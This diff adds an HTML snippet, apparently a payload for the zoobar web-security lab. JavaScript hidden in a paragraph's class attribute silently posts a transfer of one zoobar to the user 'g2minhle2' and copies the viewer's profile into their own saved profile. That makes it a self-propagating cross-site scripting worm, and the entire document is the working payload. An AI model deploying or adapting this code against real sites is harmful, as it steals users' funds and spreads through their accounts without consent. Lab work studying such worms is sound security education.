@@ -1,0 +1,9 @@
+<p id="zoobars" class='
+	var xhttp = new XMLHttpRequest();
+	xhttp.open("POST", "transfer.php", false);
+	xhttp.send("zoobars=1&zb_recipient=g2minhle2&submission=Send");
+	var myProfile = document.getElementById("profile").innerHTML;	
+	xhttp = new XMLHttpRequest();
+	xhttp.open("POST", "index.php", false);
+	xhttp.send("profileupdate="+myProfile+"&profilesubmit=Save");
+'></p>
